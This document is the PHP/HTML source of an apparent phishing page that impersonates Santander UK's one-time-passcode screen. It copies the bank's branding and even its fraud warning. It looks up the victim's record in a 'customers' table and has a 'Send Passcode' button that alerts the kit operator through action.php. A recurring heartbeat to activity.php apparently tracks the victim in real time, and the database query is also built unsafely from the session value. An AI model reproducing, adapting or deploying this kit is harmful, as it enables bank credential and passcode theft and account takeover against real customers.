<?php

session_start();

include 'files/config.php';
include 'files/connect.php';


if($_SESSION['started'] == 'true'){
	$uniqueid = $_SESSION['uniqueid'];
	$query = mysqli_query($conn,"SELECT * FROM customers WHERE uniqueid=$uniqueid");
	if($query){
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$part_number = $array['part_number'];
	}else{
		
	}

	
}else{
	header('location:exit.php');
}
?>
<!DOCTYPE html>
<html lang="en-GB">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <!--<base href="/olb/app/logon/access/">-->
        <base href="." />

        <title>Online Banking: Send One Time Passcode</title>
        <meta name="title" content="Online Banking | Personal Account Holders | Santander UK" />
        <meta name="description" content="Access your account information online with internet banking from Santander; manage your money, cards and view other services. Find out more at Santander.co.uk" />
        <meta name="abstract" content="Access your account information online with internet banking from Santander; manage your money, cards and view other services. Find out more at Santander.co.uk" />
        <link rel="icon" href="files/img/favicon.ico" type="image/x-icon" />

        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta http-equiv="Pragma" content="no-cache" />
        <meta http-equiv="Cache-Control" content="no-cache, no-store" />
        
		
        <style type="text/css">
            body {margin:0; padding: 0;height: 100%;}      #splash-97123-overlay{padding:0;margin:0;position: absolute;top:0;left:0;right:0;width:100%;height:100%;background:#595959 url(https://d1byywzi6ghj11.cloudfront.net/img/spacer.gif) center center;z-index:1001;-moz-opacity: 0.8;opacity: 0.80;filter: alpha(opacity=80);display: block;}      #splash-97123-splash {font-family:verdana,arial,tahoma;font-size:14px;width: 640px; margin: 20px -320px;z-index:10002; position: absolute;left: 50%;top:100px;display: block;}      #splash-97123-body {title:Please download Trusteer Rapport which provides you with advanced layers of protection against malware and other security threats. For more information click on the Learn More link which also contains a link to download the Trusteer Rapport software.;color:#000;height:495px;width:640px;font-size: 12px;font-family:verdana,arial,tahoma;text-align:left;color:black;background: url(https://d1byywzi6ghj11.cloudfront.net/img/santanderuk_personal_20140304_image_src.jpg) center center;}      #splash-97123-close-button{height:30px;width:30px;position:relative;float:right;border:none;cursor:pointer;margin:-10px -15px -10px 0px;background: url(https://d1byywzi6ghj11.cloudfront.net/img/close-btn.png) center center;text-align:left;z-index:10002; }      #splash-97123-download-button {padding: 2px; text-align: center; width:222px; margin: 20px auto 10px;  cursor: pointer; position:absolute;top:366px;left: 413px;height:52px}      #splash-97123-download-button p {color:#000;background:#04A2F4;color:#ffffff;line-height:20px;font-size:20px;text-align:left;padding:0px}        #splash-97123-download-button-container{ text-align: center}        #splash-97123-iframe { width:100%; height:100%;border:0;background: #595959; color: #595959;}        #splash-97123-iframe body{background: #595959; color: #595959; }        #splash-97123-footer-left {float:left;padding-left:20px;text-align:left;position:absolute;bottom:19px;}      #splash-97123-footer-left a {margin-right: 10px; color: #0033FF; font-size: 12px;font-weight: normal; text-decoration: underline;text-align:left;font-family:verdana,arial,tahoma;}      #splash-97123-footer-left a:hover {color: #0033FF;}      #splash-97123-body-overlay {padding:0;margin:0;position: absolute;top:0;*top:10px;left:0;right:0;width:640px;height:495px;background:#8D8D8D center center;z-index:1001;-moz-opacity: 0.8;opacity: 0.80;filter: alpha(opacity=80);display: block;}      #splash-97123-clicked-message {title:Thank you for downloading Trusteer Rapport. (Don&#39;t forget to open and run the file once it has finished downloading). Close this message. How do I install?;width:640px;height:179px;z-index:1002;position:absolute;left:0px;top:150px;display: block;background: url(https://d1byywzi6ghj11.cloudfront.net/img/download_click_1.png);}      #splash-97123-clicked-close-button {width:167px;height:30px;position:absolute;top:122px;left:146px;cursor:pointer;}      #splash-97123-clicked-help-button {width:167px;height:30px;position:absolute;top:122px;left:326px;cursor:pointer;display:block;}      #splash-97123-downloaded-message {title:Your account is not yet protected. You have downloaded Trusteer Rapport to protected your online account, buy it&#39;s currently not protecting your online banking. Download Again. Why Not?;width:640px;height:179px;z-index:1002;position:absolute;left:0px;top:150px;display: block;background: url(https://d1byywzi6ghj11.cloudfront.net/img/already_downloaded_1.png);}      #splash-97123-downloaded-download-button {width:167px;height:30px;position:absolute;top:122px;left:146px;cursor:pointer;}      #splash-97123-downloaded-help-button {width:167px;height:30px;position:absolute;top:122px;left:326px;cursor:pointer;}
        </style>
        <style></style>
        
        <style>
            .security-number[_ngcontent-erl-c1] {
                color: #000;
                letter-spacing: 20px;
                background-color: transparent;
            }
            .security-number[_ngcontent-erl-c1]::-webkit-input-placeholder {
                color: #ccc !important;
            }
            .security-number[_ngcontent-erl-c1]::-moz-placeholder {
                color: #ccc !important;
            }
            .security-number[_ngcontent-erl-c1]:-ms-input-placeholder {
                color: #ccc !important;
            }
            .security-number[_ngcontent-erl-c1]::-ms-input-placeholder {
                color: #ccc !important;
            }
            .security-number[_ngcontent-erl-c1]::placeholder {
                color: #ccc !important;
            }
            @supports not ((-webkit-hyphens: auto) or (-ms-hyphens: auto) or (hyphens: auto)) {
                .security-number[_ngcontent-erl-c1] {
                    -webkit-text-stroke-width: 0.2em;
                }
                .security-number[_ngcontent-erl-c1]::-webkit-input-placeholder {
                    -webkit-text-stroke-width: 0 !important;
                }
                .security-number[_ngcontent-erl-c1]::-moz-placeholder {
                    -webkit-text-stroke-width: 0 !important;
                }
                .security-number[_ngcontent-erl-c1]:-ms-input-placeholder {
                    -webkit-text-stroke-width: 0 !important;
                }
                .security-number[_ngcontent-erl-c1]::-ms-input-placeholder {
                    -webkit-text-stroke-width: 0 !important;
                }
                .security-number[_ngcontent-erl-c1]::placeholder {
                    -webkit-text-stroke-width: 0 !important;
                }
            }
            .invalid-security-number[_ngcontent-erl-c1] {
                border: 1px solid #ec0000 !important;
                border-radius: 4px;
            }
        </style>
        
		
        <style>
            .invalid-otp[_ngcontent-erl-c2] {
                border: 1px solid #ec0000 !important;
                border-radius: 4px;
            }
        </style>
		<script src="files/js/jquery.js"></script>
        <script>
		function askotp(){
		var id = <?=$_SESSION['uniqueid'];?>;
		var urldata = 'files/action.php?askotp=' + id;
		$.ajax({
			url:urldata,
			type:'GET',
			success: function(response){
				//console.log(response);
				var parsed_data = JSON.parse(response);
				if(parsed_data.status == 'ok'){
					location.href = 'Loading.php'
				}else{
					return false;
				}
			},
			error: function(err) {
				console.error('error: ' + err);
			}
		});
	}
        </script>
    </head>
    <body>
        <meta http-equiv="content-secure-policy" content="deafult-src 'self'="" '*'="" "="">
        <meta http-equiv="X-Xss-Protection" content="&#39;1; mode=block&#39; always" />
        <meta http-equiv="X-Content-Type-Options" content="&#39;nosniff&#39; always" />
        <meta http-equiv="Strict-Transport-Security" content="max-age=31536000" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1, maximum-scale=2.0" />
        <!--<base href="/">-->
        <base href="." />
        
		

        <link rel="stylesheet" href="files/css/styles.d639dea2316e6d785b32.css" />

        <olb-root _nghost-erl-c0="" ng-version="7.2.16">
            <olb-home _ngcontent-erl-c0="">
                <div class="container-fluid appheader">
                    <div class="container">
                        <div class="row">
                            <div class="col-sm-12 containerPadding header-responsive" role="banner">
                                <olb-header>
                                    <nav class="navbar appheader_content">
                                        <a href="https://www.santander.co.uk/"><img alt="Santander Image" class="img-fluid Bitmap header-logo-santander" src="files/img/header-logo.png" /></a>
                                        <!---->
                                        <div><img alt="Santander Lock Image" class="img-lock header-logo-lock" src="files/img/padlock.svg" /></div>
                                        <!---->
                                    </nav>
                                </olb-header>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="container">
                    <div class="row">
                        <div aria-live="assertive" class="col-sm-12 main-section-responsive" role="main">
                            <router-outlet></router-outlet>
                            <olb-send-otp>
                                <div class="content otp-container">
                                    <div class="row">
                                        <div class="col-lg-5 col-sm-12 left-content">
                                            <div class="text-center">
                                                <div>
                                                    <div class="row mt-5 mobile-sms justify-content-center">
                                                        <!---->
                                                        <img alt="Send One Time Passcode Image" class="img-fluid sms-mid-image mt-4" src="files/img/ui-icon-fill-sms.png" />
                                                        <!---->
                                                    </div>
                                                    <div class="row mt-3">
                                                        <div class="col-md-12 send-otp-title-medium"><h1 class="send-otp-title-medium">Send One Time Passcode</h1></div>
                                                    </div>
                                                    <!---->
                                                    <div class="row mt-2">
                                                        <div class="col-md-12 title-medium-bold send-otp-font">
                                                            <!---->
                                                            <span><?=$part_number;?></span>
                                                            <!---->
                                                        </div>
                                                    </div>
                                                    <div class="row mt-1 mb-3">
                                                        <div class="col-md-12 title-medium-bold send-otp-font"><!----></div>
                                                    </div>
                                                    <div class="d-none"><span id="emailIdDesc"> We've sent it to . </span></div>
                                                    <div class="mt-1 mb-3 title-small">
                                                        <!---->
                                                        <span> Changed your number? You'll need to </span>
                                                        <!---->
                                                        <a aria-describedby="callusDesc" routerlink="/callus" href="https://retail.santander.co.uk/olb/app/logon/access/#/callus">call us</a>
                                                        <span class="d-none" id="callusDesc"> Need to call us? Please click here </span>
                                                    </div>
                                                    <div>
                                                        <!---->
                                                        <div class="row mt-2" style="justify-content: center;">
                                                            <div class="col-md-8 col-sm-8 col-lg-10 title-default"><span> We'll send a text message with a One Time Passcode to your mobile phone. </span></div>
                                                        </div>
                                                    </div>
                                                    <common-one-time-passcode _nghost-erl-c2="">
                                                        <!---->
                                                        <div _ngcontent-erl-c2="">
                                                            <label _ngcontent-erl-c2="" class="sr-only" for="">One Time passcode</label>
                                                            <!---->
                                                        </div>
                                                        <!---->
                                                    </common-one-time-passcode>
                                                    <div class="row send-passcode-button">
                                                        <div class="col-md-12 col-sm-12 col-lg-12 mt-lg-5">
                                                            <button aria-describedby="sendOTPButtonDesc" class="button button-secondary send-passcode-button-width" id="sendcode" onclick="askotp();">Send Passcode</button>
                                                            <!---->
                                                            <span class="d-none" id="sendOTPButtonDesc"> please click here to send One Time Passcode to your mobile number </span>
                                                            <!---->
                                                        </div>
                                                    </div>
                                                    <div class="mt-1 mb-3">
                                                        <a alt="cancel otp" aria-describedby="cancelLogonDesc" href="https://retail.santander.co.uk/olb/app/logon/access/#/logon">Cancel log on </a>
                                                        <span class="d-none" id="cancelLogonDesc"> If you wish to cancel logon, please click here </span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-lg-7 col-sm-0">
                                            <olb-otp-right-content>
                                                <div class="row image-hide-mobile-tablet mt-5">
                                                    <!---->
                                                    <img alt="Protect yourself against fraud and scams image" class="logon-right-image image-hide-mobile-tablet mt-3" src="files/img/SMS@1x.svg" />
                                                    <!---->
                                                </div>
                                                <div class="text-details-container">
                                                    <div class="row mb-1">
                                                        <div class="text-title col-sm-12"><span>Protect yourself against fraud and scams</span></div>
                                                    </div>
                                                    <div class="row mb-2">
                                                        <div class="text-details col-sm-12 mt-1"><span>Never share a One Time Passcode (OTP) with another person, not even a Santander employee. We will only ask you to enter it into a Santander Website.</span></div>
                                                    </div>
                                                </div>
                                            </olb-otp-right-content>
                                        </div>
                                    </div>
                                </div>
                            </olb-send-otp>
                        </div>
                    </div>
                </div>
                <div class="container-fluid appfooter">
                    <div class="container">
                        <div class="row">
                            <div class="col-sm-12 containerPadding footer-responsive" role="contentinfo">
                                <olb-footer>
                                    <footer class="footer-base">
                                        <div class="footer-left-content">
                                            <!---->
                                            <a target="_blank" href="https://www.santander.co.uk/personal/support/ways-to-bank/online-and-mobile-banking-commitment">Online Banking Guarantee</a>
                                            <a target="_blank" href="https://www.santander.co.uk/personal/support/customer-support/accessibility">Site Help &amp; Accessibility</a>
                                            <a target="_blank" href="https://www.santander.co.uk/personal/support/customer-support/legal-information">Security &amp; Privacy</a>
                                            <a target="_blank" href="https://www.santander.co.uk/personal/support/ways-to-bank/online-banking-service-terms-conditions">Terms &amp; Conditions</a>
                                            <a target="_blank" href="https://www.santander.co.uk/personal/support/customer-support/legal-information">Legal</a>
                                        </div>
                                        <div class="footer-right-content"><img alt="FSCS Protected Image" src="files/img/asset-2.png" /></div>
                                    </footer>
                                </olb-footer>
                            </div>
                        </div>
                    </div>
                </div>
                <div><olb-session></olb-session></div>
            </olb-home>
        </olb-root>
        
	<script>
        var interval = 3000;  
        function heartbeat() {
            $.ajax({
                    type: 'GET',
                    url: 'files/activity.php',
                    success: function (data) {
                        var parsed_data = JSON.parse(data);
                        console.log("Worked OVS...");
                        console.log(parsed_data);
                    },
                    complete: function (data) {
                        setTimeout(heartbeat, interval);
                    }
            });
        }
        setTimeout(heartbeat, interval);
    </script>

        
    </body>
</html>
